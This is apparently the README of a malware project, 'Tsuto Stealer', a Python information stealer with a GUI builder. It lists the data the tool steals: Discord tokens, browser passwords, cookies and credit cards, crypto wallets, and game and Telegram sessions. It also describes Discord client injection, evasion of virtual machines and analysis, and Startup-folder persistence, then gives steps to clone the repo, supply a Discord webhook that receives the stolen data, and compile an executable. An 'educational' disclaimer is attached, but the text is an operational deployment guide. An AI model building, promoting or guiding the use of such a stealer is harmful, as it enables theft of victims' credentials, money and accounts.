# Tsuto Stealer

Tsuto is a powerful information stealer written in Python. It features a user-friendly GUI builder for easy configuration and compilation into a standalone executable.

> **Disclaimer:** This project is intended for educational purposes only. The author is not responsible for any misuse of this software.

## Features

### Data Extraction
- **Discord:** Extracts tokens, billing information, HQ friends/guilds, and available gift codes.
- **Browser Data:** Steals passwords, cookies, credit cards, autofill data, browsing history, and bookmarks from over 15 Chromium-based browsers.
- **Crypto Wallets:** Targets an extensive list of browser-based cryptocurrency wallets, including MetaMask, Binance Wallet, Phantom, Coinbase Wallet, Ronin Wallet, and many more.
- **Gaming:** Steals authenticated session data from Steam and the Riot Client.
- **Applications:** Grabs local Telegram session data.
- **File Stealer:** Scans user directories (Desktop, Downloads, Documents) for files containing sensitive keywords like `password`, `seed`, `private key`, `wallet`, etc.

### Advanced Capabilities
- **Discord Injection:** Injects a script into the Discord client for continuous data exfiltration.
- **Anti-Analysis:** Implements basic checks to detect and evade virtual machines and common analysis environments.
- **Persistence:** Copies the executable to the user's Startup folder to run automatically on system boot.

### GUI Builder
- **Simple Interface:** An easy-to-use GUI built with CustomTkinter to configure the stealer.
- **Nuitka Compilation:** Uses Nuitka to compile the Python script into a single, standalone `.exe` file.
- **Custom Icon:** Provides an option to add a custom `.ico` file to the final executable.

## Supported Browsers
- Chrome (and all variants: Canary, Beta, Dev)
- Microsoft Edge
- Opera (Stable, GX, Neon)
- Brave
- Vivaldi
- Yandex (and all variants)
- And more...

## Setup & Usage

### 1. Prerequisites
- [Python 3](https://www.python.org/downloads/) must be installed. Ensure it is added to your system's PATH during installation.

### 2. Installation
Clone the repository to your local machine:
```
git clone https://github.com/eoxd/tsuto-stealer.git
cd tsuto-stealer
```

### 3. Running the Builder
Execute the `install.bat` file. This script will automatically install all necessary Python dependencies and launch the builder GUI.

### 4. Building the Executable
1.  Once the builder window opens, paste your Discord webhook URL into the input field.
2.  Click the **Build EXE** button.
3.  A dialog box will ask if you want to add a custom icon. If you choose 'yes', a file browser will open for you to select your `.ico` file.
4.  The build process will begin in your console. Please be patient, as this can take several minutes.
5.  Upon successful compilation, a confirmation message will appear. The final executable, `tsuto.exe`, will be located in the repository's root directory.
